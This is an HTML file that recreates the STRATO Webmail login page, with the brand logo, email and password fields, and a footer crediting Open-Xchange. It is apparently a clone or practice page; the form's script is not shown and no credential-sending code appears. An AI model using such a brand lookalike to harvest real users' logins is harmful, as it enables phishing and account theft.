<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css"
    />
    <link rel="stylesheet" href="/css/style.css" />
    <title>Login - STRATO Webmail</title>
  </head>
  <body>
    <div class="main">
      <div class="main-img">
        <img src="/image/logo_strato_white.svg" alt="" />
      </div>
      <div class="contain">
        <div class="contain-tag">
          <i class="bi bi-question-circle-fill"></i>
          <a href="">Help & Contact </a>
        </div>
        <div class="contain-label">
          <i class="bi bi-globe-asia-australia"></i>
          <label>English(US)</label>
        </div>
        <div class="btn">
          <a href="">Customer Login</a>
        </div>
      </div>
    </div>
    <form id="form" class="form">
      <div class="form-header">
        <i class="bi bi-envelope-fill"></i>
        <p>STRATO Webmail</p>
      </div>
      <div class="form-title">
        <h2>Login</h2>
      </div>
      <div class="form-input">
        <div class="input-email">
          <label>Email Address</label>
          <i class="bi bi-envelope-fill"></i>
          <input type="email" id="email" />
          <!-- <span class="error"></span> -->
        </div>
        <div class="input-password">
          <label>Password</label>
          <i class="bi bi-lock-fill"></i>
          <input
            type="password"
            id="password"
            value="password"
            title="Enter password correctly!"
          />
          <a href="">Forget your password?</a>
          <span class="error"></span>
        </div>
      </div>
      <div class="form-check">
        <input type="checkbox" /><span>Stay signed in</span>
      </div>
      <div class="form-btn">
        <button
          type="submit"
          class="btn"
          id="btn"
          onclick="myValidation()"
          value="Submit"
        >
          Sign in
        </button>
      </div>
    </form>

    <div class="footer-section">
      <footer class="footer-tag">
        <div class="footer-link">
          <a href="">STRATO-HOSTING.co.uk</a>
          <a href="">Term & Conditions</a>
          <a href="">Privacy Policy</a>
          <a href="">Imprint</a>
        </div>
        <div class="footer-link-tag">
          <i class="bi bi-c-circle"></i><span> 2024 Open-Xchange GmbH</span>
          <p>Version: 7.10.6</p>
        </div>
      </footer>
    </div>
  </body>
  <script src="/js/index.js"></script>
</html>
